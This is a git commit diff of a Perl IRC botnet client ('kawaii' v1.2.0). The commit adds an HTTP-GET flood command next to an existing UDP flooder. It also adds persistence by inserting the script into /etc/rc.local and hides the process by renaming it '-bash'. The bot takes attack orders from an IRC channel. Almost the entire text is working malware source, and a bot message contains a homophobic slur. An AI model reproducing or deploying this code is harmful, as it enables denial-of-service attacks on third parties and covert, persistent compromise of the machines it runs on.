d2af83c6fcc5555bddafd831f9d1cee4073b95e6
Vypor <booker@3ky.cc>
2014-06-05 17:36:43 -0700

    V1.2.0

--- kawaii-v1.1.0.pl
+++ kawaii-v1.1.0.pl
@@ -1,19 +1,19 @@
 use strict;
 use Socket;
 use IO::Socket;
+addtostartup();
 
 #Commands
-#!udp <ip> <port> <time> <packetsize> //Udpfloder
+#!udp <ip> <port> <time> <packetsize> //UDP Flooder
+#!httpget <host> <page> <time> //HTTP-GET Flooder
 #!quit //Quits bot
 #Made by Vypor | Github.com/Vypor
-#kawaii-v1.0.0
-
 #Hidden Proccess
 $0 = "-bash";
 
 #Server IP or hostname, Channel, Serverpassword (nothing if you dont have one)
-my $server      = "vypor.net";
-my $channel     = "#bot";
+my $server      = "irc.bot.net";
+my $channel     = "#bots";
 my $maxnamechar = "6";
 my $serverpass  = "";
 
@@ -33,8 +33,12 @@ if ( $serverpass = !'' ) {
     print $sock "PASS $serverpass\r\n";
 }
 
+#Auth Ourselfs
 print $sock "NICK $nick\r\n";
 while ( my $input = <$sock> ) {
+    
+	#Reconnect And Change Nick Name
+
     if ( $input =~ /433/ ) {
         goto reconnect;
     }
@@ -64,6 +68,8 @@ while (<$sock>) {
         my ( $method, $host, $port, $time, $packetsize, $other ) =
           split( / /, $message, 6 );
 
+#IRC Command Parsing / Sub calling
+
         if ( $method =~ /^!quit\s*$/ ) {
             quitme($method);
         }
@@ -73,16 +79,25 @@ while (<$sock>) {
         if ( $method =~ /^!hi\s*$/ ) {
             HI();
         }
+        if ( $method =~ /^!httpget\s*$/ ) {
+            httpGET( $host, $port, $time );
+        }
+
+
+#IRC Command Functions
+
 
         sub udp {
             my ( $iaddr, $endtime, $psize, $pport );
-	            $iaddr = inet_aton("$host") or print "Cant find host..\n";
-        	    $endtime = time() + ( $time ? $time : 1000000 );
-            socket( flood, PF_INET, SOCK_DGRAM, 17 );
-            	print $sock "PRIVMSG $chnl :Throwing Kittens at: $host for $time seconds\r\n";
+        	    $iaddr = inet_aton("$host") or print "Cant find host..\n";
+           	    $endtime = time() + ( $time ? $time : 1000000 );
+            	    socket( flood, PF_INET, SOCK_DGRAM, 17 );
+            
+		print $sock "PRIVMSG $chnl :Throwing Kittens at: $host for $time seconds\r\n";
+
             for ( ; time() <= $endtime ; ) {
-                	$psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 );
-            	    $pport = $port ? $port : int( rand(65500) ) + 1;
+                $psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 );
+                $pport = $port ? $port : int( rand(65500) ) + 1;
                 send( flood, pack( "a$psize", "flood" ), 0, pack_sockaddr_in( $pport, $iaddr )
                 );
             }
@@ -103,7 +118,44 @@ while (<$sock>) {
             print $sock "PRIVMSG $chnl :Faggot. faggots say hi..\r\n";
         }
 
+        sub httpGET {
+            print $sock "PRIVMSG $chnl :Starting HTTP-GEEEET Flood.\r\n";
+            my $endtime;
+            $endtime = time() + ( $time ? $time : 1000000 );
+            for ( ; time() <= $endtime ; ) {
+                my $httpget = IO::Socket::INET->new(
+                    Proto    => 'tcp',
+                    PeerAddr => $host,
+                    PeerPort => '80',
+                ) or return $!;
+                print $httpget "GET /" . $port . " HTTP/1.0\r\n";
+                print $httpget "Host: ", $host, "\r\n";
+                print $httpget "Connection: close", "\r\n";
+                print $httpget "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
+                print $httpget "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
+            }
+            print $sock "PRIVMSG $chnl :Finished HTTP-GEEEET Flood.\r\n";
+        }
+
     }
 }
 sleep 15;
 goto reconnect;
+
+
+
+#System Checks
+sub addtostartup {
+    my @checkstr;
+    my $location = sprintf( $ENV{'PWD'} );
+    my $name     = "perl $location/$0";
+    open( IN, '/etc/rc.local' ) or print "Couldnt add to startup\n";
+    while ( my $line = <IN> ) { push( @checkstr, $line ); }
+    my $checkme = join "", @checkstr;
+
+    if ( $checkme =~ /$name/ ) { }
+    else {
+        print "Adding to Startup...\n";
+        system("sed -i -e '1i$name\' /etc/rc.local");
+    }
+}
